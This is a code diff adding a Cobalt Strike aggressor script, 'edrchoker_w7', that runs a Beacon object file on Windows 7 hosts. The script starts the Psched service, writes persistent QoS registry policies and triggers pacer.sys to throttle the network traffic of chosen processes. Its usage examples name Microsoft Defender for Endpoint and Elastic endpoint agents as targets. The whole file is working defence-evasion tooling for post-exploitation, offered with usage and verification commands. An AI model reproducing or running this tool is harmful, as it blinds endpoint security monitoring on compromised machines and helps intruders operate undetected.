@@ -1,0 +1,86 @@
+# edrchoker_w7.cna — Win7 QoS throttle: service start + v1.0 registry + pacer.sys ZAW
+#
+# Windows 7 pacer.sys (NDIS6) enforces per-process throttle rules in kernel mode
+# when it receives the ZAW event (IOCTL 0x128050). No WMI, no userland service
+# needed to translate — the kernel driver handles it directly.
+#
+# Why not edrchoker_v2 on Win7:
+#   MSFT_NetQosPolicySettingData WMI class does not exist before Windows 8.
+#   GetObject() returns 0x80041002 (WBEM_E_NOT_FOUND).
+#
+# This BOF adds service management: auto-starts Psched if stopped before
+# writing registry + sending ZAW trigger, making it fully self-contained.
+#
+# Persistence: registry key is NON_VOLATILE — survives reboot, re-enforced
+# when Psched loads at boot.
+#
+# Prereq: Admin/SYSTEM (HKLM write + SCM service start)
+#
+# Usage:
+#   edrchoker_w7 add        "proc1.exe;proc2.exe"   start Psched + write + trigger
+#   edrchoker_w7 remove     "proc1.exe;proc2.exe"   delete matching + trigger
+#   edrchoker_w7 remove_all                         delete all owned + trigger
+#   edrchoker_w7 list                               list policies
+#   edrchoker_w7 check                              Psched state + policy list
+
+alias edrchoker_w7 {
+    local('$bof $args $bid $handle $path $cmd $procs');
+    $bid = $1;
+    $cmd = $2;
+
+    if ($cmd is $null || $cmd eq "") {
+        berror($bid, "[edrchoker_w7] usage: edrchoker_w7 <add|remove|remove_all|list|check> [procs]");
+        return;
+    }
+
+    $procs = "";
+
+    if ($cmd eq "add" || $cmd eq "remove") {
+        if (size(@_) < 3 || $3 eq "") {
+            berror($bid, "[edrchoker_w7] " . $cmd . " requires a process list: \"proc1.exe;proc2.exe\"");
+            return;
+        }
+        $procs = $3;
+    }
+
+    $path   = script_resource("edrchoker_w7.x64.o");
+    $handle = openf($path);
+    if ($handle is $null) { berror($bid, "[edrchoker_w7] cannot open BOF: " . $path); return; }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) { berror($bid, "[edrchoker_w7] readb failed"); return; }
+
+    if ($procs ne "") {
+        btask($bid, "EDRChoker Win7: " . $cmd . " " . $procs);
+    } else {
+        btask($bid, "EDRChoker Win7: " . $cmd);
+    }
+
+    $args = bof_pack($bid, "zz", $cmd, $procs);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "edrchoker_w7",
+    "Win7 QoS throttle: auto-start Psched + v1.0 registry + IOCTL ZAW trigger",
+    "Usage:\n" .
+    "  edrchoker_w7 add        \"p1.exe;p2.exe\"   start Psched + write + trigger\n" .
+    "  edrchoker_w7 remove     \"p1.exe;p2.exe\"   xóa policies theo process + trigger\n" .
+    "  edrchoker_w7 remove_all                   xóa TẤT CẢ owned policies + trigger\n" .
+    "  edrchoker_w7 list                         liệt kê active policies\n" .
+    "  edrchoker_w7 check                        Psched state + policy list\n\n" .
+    "Architecture:\n" .
+    "  Win7 pacer.sys (NDIS6) = kernel-mode per-process QoS enforcement\n" .
+    "  ZAW event (IOCTL 0x128050) → kernel reads v1.0 registry → enforces immediately\n" .
+    "  No WMI, no userland service required\n\n" .
+    "Why not v2 on Win7:\n" .
+    "  MSFT_NetQosPolicySettingData absent pre-Win8 → WBEM_E_NOT_FOUND\n\n" .
+    "Prereq: Admin/SYSTEM (HKLM write + SCM start)\n\n" .
+    "Examples:\n" .
+    "  edrchoker_w7 add    \"MsSense.exe;elastic-endpoint.exe\"\n" .
+    "  edrchoker_w7 check\n" .
+    "  edrchoker_w7 remove_all\n\n" .
+    "Verify:\n" .
+    "  shell sc query Psched\n" .
+    "  shell reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS"
+);
